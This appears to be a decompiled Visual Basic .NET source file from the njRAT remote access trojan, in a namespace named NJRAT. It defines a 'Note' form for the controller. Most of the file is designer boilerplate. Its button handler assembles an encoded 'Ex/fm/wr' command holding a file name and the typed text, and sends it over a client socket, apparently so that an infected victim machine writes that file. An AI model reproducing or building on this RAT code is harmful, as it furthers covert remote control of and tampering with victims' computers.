Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000018 RID: 24
	<DesignerGenerated()>
	Public Partial Class Note
		Inherits Form

		' Token: 0x0600040B RID: 1035 RVA: 0x00002C0B File Offset: 0x00000E0B
		<DebuggerNonUserCode()>
		Public Sub New()
			Note.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600040C RID: 1036 RVA: 0x00025E98 File Offset: 0x00024098
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Note.__ENCList
			SyncLock _ENCList
				If Note.__ENCList.Count = Note.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Note.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Note.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Note.__ENCList(num) = Note.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Note.__ENCList.RemoveRange(num, Note.__ENCList.Count - num)
					Note.__ENCList.Capacity = Note.__ENCList.Count
				End If
				Note.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700017D RID: 381
		' (get) Token: 0x0600040F RID: 1039 RVA: 0x000267C0 File Offset: 0x000249C0
		' (set) Token: 0x06000410 RID: 1040 RVA: 0x000267D8 File Offset: 0x000249D8
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Dim value2 As EventHandler = AddressOf Me.FormSkin1_Click
				If Me._FormSkin1 IsNot Nothing Then
					RemoveHandler Me._FormSkin1.Click, value2
				End If
				Me._FormSkin1 = value
				If Me._FormSkin1 IsNot Nothing Then
					AddHandler Me._FormSkin1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700017E RID: 382
		' (get) Token: 0x06000411 RID: 1041 RVA: 0x00026830 File Offset: 0x00024A30
		' (set) Token: 0x06000412 RID: 1042 RVA: 0x00002C1F File Offset: 0x00000E1F
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x1700017F RID: 383
		' (get) Token: 0x06000413 RID: 1043 RVA: 0x00026848 File Offset: 0x00024A48
		' (set) Token: 0x06000414 RID: 1044 RVA: 0x00026860 File Offset: 0x00024A60
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000180 RID: 384
		' (get) Token: 0x06000415 RID: 1045 RVA: 0x000268B8 File Offset: 0x00024AB8
		' (set) Token: 0x06000416 RID: 1046 RVA: 0x00002C28 File Offset: 0x00000E28
		Friend Overridable Property UserImage1 As UserImage
			<DebuggerNonUserCode()>
			Get
				Return Me._UserImage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UserImage)
				Me._UserImage1 = value
			End Set
		End Property

		' Token: 0x17000181 RID: 385
		' (get) Token: 0x06000417 RID: 1047 RVA: 0x000268D0 File Offset: 0x00024AD0
		' (set) Token: 0x06000418 RID: 1048 RVA: 0x00002C31 File Offset: 0x00000E31
		Friend Overridable Property FlatMini2 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini2 = value
			End Set
		End Property

		' Token: 0x17000182 RID: 386
		' (get) Token: 0x06000419 RID: 1049 RVA: 0x000268E8 File Offset: 0x00024AE8
		' (set) Token: 0x0600041A RID: 1050 RVA: 0x00026900 File Offset: 0x00024B00
		Friend Overridable Property FlatButton4 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton4_Click
				If Me._FlatButton4 IsNot Nothing Then
					RemoveHandler Me._FlatButton4.Click, value2
				End If
				Me._FlatButton4 = value
				If Me._FlatButton4 IsNot Nothing Then
					AddHandler Me._FlatButton4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000183 RID: 387
		' (get) Token: 0x0600041B RID: 1051 RVA: 0x00026958 File Offset: 0x00024B58
		' (set) Token: 0x0600041C RID: 1052 RVA: 0x00002C3A File Offset: 0x00000E3A
		Friend Overridable Property PictureBox4 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox4 = value
			End Set
		End Property

		' Token: 0x0600041D RID: 1053 RVA: 0x00002C43 File Offset: 0x00000E43
		Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)
			Me.FlatButton2.Enabled = True
		End Sub

		' Token: 0x0600041E RID: 1054 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub MenuStrip1_ItemClicked(sender As Object, e As ToolStripItemClickedEventArgs)
		End Sub

		' Token: 0x0600041F RID: 1055 RVA: 0x00026970 File Offset: 0x00024B70
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Dim array As String() = New String(8) {}
			array(0) = "Ex"
			array(1) = Class7.string_1
			array(2) = "fm"
			array(3) = Class7.string_1
			array(4) = "wr"
			array(5) = Class7.string_1
			array(6) = Class6.smethod_14(Me.FN)
			array(7) = Class7.string_1
			Dim textBox As TextBox = Me.TextBox1
			Dim text As String = textBox.Text
			textBox.Text = text
			array(8) = Class6.smethod_14(text)
			Me.SK.Send(String.Concat(array))
			Me.FlatButton2.Enabled = False
		End Sub

		' Token: 0x06000420 RID: 1056 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub FormSkin1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000421 RID: 1057 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton4_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x040001DB RID: 475
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001DD RID: 477
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x040001DE RID: 478
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x040001DF RID: 479
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x040001E0 RID: 480
		<AccessedThroughProperty("UserImage1")>
		Private _UserImage1 As UserImage

		' Token: 0x040001E1 RID: 481
		<AccessedThroughProperty("FlatMini2")>
		Private _FlatMini2 As FlatMini

		' Token: 0x040001E2 RID: 482
		<AccessedThroughProperty("FlatButton4")>
		Private _FlatButton4 As FlatButton

		' Token: 0x040001E3 RID: 483
		<AccessedThroughProperty("PictureBox4")>
		Private _PictureBox4 As PictureBox

		' Token: 0x040001E4 RID: 484
		Public FN As String

		' Token: 0x040001E5 RID: 485
		Public SK As Client
	End Class
End Namespace
